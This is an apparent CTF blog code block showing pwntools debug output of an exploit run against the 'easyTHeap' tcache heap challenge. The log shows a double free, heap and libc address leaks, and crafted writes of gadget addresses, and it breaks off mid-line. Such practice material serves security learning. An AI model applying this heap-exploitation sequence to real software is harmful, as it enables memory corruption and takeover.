<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~/Desktop$ python exp_debug.py</span><br><span class="line">[+] Starting local process <span class="string">&#x27;./vn_pwn_easyTHeap_patch&#x27;</span> argv=[<span class="string">&#x27;./vn_pwn_easyTHeap_patch&#x27;</span>] : pid <span class="number">4049</span></span><br><span class="line">[DEBUG] PLT <span class="number">0x820</span> free</span><br><span class="line">[DEBUG] PLT <span class="number">0x830</span> puts</span><br><span class="line">[DEBUG] PLT <span class="number">0x840</span> __stack_chk_fail</span><br><span class="line">[DEBUG] PLT <span class="number">0x850</span> setbuf</span><br><span class="line">[DEBUG] PLT <span class="number">0x860</span> printf</span><br><span class="line">[DEBUG] PLT <span class="number">0x870</span> memset</span><br><span class="line">[DEBUG] PLT <span class="number">0x880</span> alarm</span><br><span class="line">[DEBUG] PLT <span class="number">0x890</span> read</span><br><span class="line">[DEBUG] PLT <span class="number">0x8a0</span> malloc</span><br><span class="line">[DEBUG] PLT <span class="number">0x8b0</span> atoi</span><br><span class="line">[DEBUG] PLT <span class="number">0x8c0</span> exit</span><br><span class="line">[DEBUG] PLT <span class="number">0x8d0</span> __cxa_finalize</span><br><span class="line">[*] <span class="string">&#x27;/home/ubuntu/Desktop/vn_pwn_easyTHeap_patch&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[DEBUG] PLT <span class="number">0x21020</span> realloc</span><br><span class="line">[DEBUG] PLT <span class="number">0x21060</span> __tls_get_addr</span><br><span class="line">[DEBUG] PLT <span class="number">0x210a0</span> memalign</span><br><span class="line">[DEBUG] PLT <span class="number">0x210b0</span> _dl_exception_create</span><br><span class="line">[DEBUG] PLT <span class="number">0x210f0</span> __tunable_get_val</span><br><span class="line">[DEBUG] PLT <span class="number">0x211a0</span> _dl_find_dso_for_object</span><br><span class="line">[DEBUG] PLT <span class="number">0x211e0</span> calloc</span><br><span class="line">[DEBUG] PLT <span class="number">0x212c0</span> malloc</span><br><span class="line">[DEBUG] PLT <span class="number">0x212c8</span> free</span><br><span class="line">[*] <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[DEBUG] Received <span class="number">0x64</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;Welcome to V&amp;N challange!\n&#x27;</span></span><br><span class="line">    <span class="string">&quot;This&#x27;s a tcache heap for you.\n&quot;</span></span><br><span class="line">    <span class="string">&#x27;1.Add\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2.Edit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3.Show\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4.Delete\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5.Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;choice: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;1\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x5</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;size?&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;80\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x32</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;Done!\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1.Add\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2.Edit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3.Show\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4.Delete\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5.Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;choice: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;4\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x4</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;idx?&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;0\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x32</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;Done!\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1.Add\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2.Edit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3.Show\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4.Delete\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5.Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;choice: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;4\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x4</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;idx?&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;0\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x32</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;Done!\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1.Add\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2.Edit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3.Show\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4.Delete\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5.Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;choice: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;3\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x4</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;idx?&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;0\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x39</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;`ruUUU\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;Done!\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1.Add\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2.Edit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3.Show\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4.Delete\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5.Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;choice: &#x27;</span></span><br><span class="line"><span class="number">0x555555757260</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;1\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x5</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;size?&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;80\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x32</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;Done!\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1.Add\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2.Edit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3.Show\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4.Delete\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5.Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;choice: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;2\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x4</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;idx?&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;1\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x8</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;content:&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x9</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">10</span> <span class="number">70</span> <span class="number">75</span> <span class="number">55</span>  <span class="number">55</span> <span class="number">55</span> <span class="number">00</span> <span class="number">00</span>  0a                        │·puU│UU··│·│</span><br><span class="line">    00000009</span><br><span class="line">[DEBUG] Received <span class="number">0x32</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;Done!\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1.Add\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2.Edit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3.Show\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4.Delete\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5.Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;choice: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;1\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x5</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;size?&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;80\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x32</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;Done!\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1.Add\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2.Edit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3.Show\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4.Delete\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5.Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;choice: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;1\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x5</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;size?&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;80\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x32</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;Done!\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1.Add\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2.Edit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3.Show\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4.Delete\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5.Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;choice: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;2\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x4</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;idx?&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;3\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x8</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;content:&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x29</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x32</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;Done!\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1.Add\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2.Edit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3.Show\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4.Delete\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5.Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;choice: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;4\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x4</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;idx?&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;3\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x32</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;Done!\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1.Add\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2.Edit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3.Show\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4.Delete\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5.Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;choice: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;3\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x4</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;idx?&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;3\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x39</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="number">00000000</span>  a0 fc dc f7  ff 7f 0a <span class="number">44</span>  6f 6e <span class="number">65</span> <span class="number">21</span>  0a <span class="number">31</span> 2e <span class="number">41</span>  │····│···D│one!│·<span class="number">1.</span>A│</span><br><span class="line">    00000010  <span class="number">64</span> <span class="number">64</span> 0a <span class="number">32</span>  2e <span class="number">45</span> <span class="number">64</span> <span class="number">69</span>  <span class="number">74</span> 0a <span class="number">33</span> 2e  <span class="number">53</span> <span class="number">68</span> 6f <span class="number">77</span>  │dd·<span class="number">2</span>│.Edi│t·<span class="number">3.</span>│Show│</span><br><span class="line">    00000020  0a <span class="number">34</span> 2e <span class="number">44</span>  <span class="number">65</span> 6c <span class="number">65</span> <span class="number">74</span>  <span class="number">65</span> 0a <span class="number">35</span> 2e  <span class="number">45</span> <span class="number">78</span> <span class="number">69</span> <span class="number">74</span>  │·<span class="number">4.</span>D│elet│e·<span class="number">5.</span>│Exit│</span><br><span class="line">    00000030  0a <span class="number">63</span> <span class="number">68</span> 6f  <span class="number">69</span> <span class="number">63</span> <span class="number">65</span> 3a  <span class="number">20</span>                        │·cho│ice:│ │</span><br><span class="line">    00000039</span><br><span class="line"><span class="number">0x7ffff79e4000</span></span><br><span class="line"><span class="number">0x7ffff7aee45c</span></span><br><span class="line"><span class="number">0x7ffff7a7cca0</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;1\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x5</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;size?&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;80\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x32</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;Done!\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1.Add\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2.Edit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3.Show\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4.Delete\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5.Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;choice: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;2\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x4</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;idx?&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;4\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x8</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span>  <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span>  <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span>  <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span>  │bbbb│bbbb│bbbb│bbbb│</span><br><span class="line">    *</span><br><span class="line">    00000040  <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span>  <span class="number">62</span> <span class="number">62</span> <span class="number">62</span> <span class="number">62</span>  1d fc dc f7  ff 7f <span class="number">00</span> <span class="number">00</span>  │bbbb│bbbb│····│····│</span><br><span class="line">    00000050  0a                                                  │·│</span><br><span class="line">    00000051</span><br><span class="line">[DEBUG] Received <span class="number">0x7b</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;Done!\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1.Add\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2.Edit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3.Show\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4.Delete\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5.Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;choice: Please input current choice.\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1.Add\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2.Edit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3.Show\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4.Delete\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5.Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;choice: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;1\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x5</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;size?&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x3</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;32\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x32</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;Done!\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1.Add\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2.Edit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3.Show\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4.Delete\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5.Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;choice: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;2\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x4</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;idx?&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;5\n&#x27;</span></span><br><span class="line">[DEBUG] Received <span class="number">0x8</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;content:&#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x1c</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="number">00000000</span>  <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43</span>  <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> <span class="number">43</span>  <span class="number">43</span> <span class="number">43</span> <span class="number">43</span> 5c  e4 ae f7 ff  │CCCC│CCCC│CCC\│····│</span><br><span class="line">    00000010  7f <span class="number">00</span> <span class="number">00</span> a8  cc a7 f7 ff  7f <span class="number">00</span> <span class="number">00</span> 0a               │····│····│····│</span><br><span class="line">    0000001c</span><br><span class="line">[DEBUG] Received <span class="number">0x32</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;Done!\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;1.Add\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;2.Edit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;3.Show\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;4.Delete\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;5.Exit\n&#x27;</span></span><br><span class="line">    <span class="string">&#x27;choice: &#x27;</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&#x27;1\n&#x27;</span></span><br><span class="line">[DEBUG] 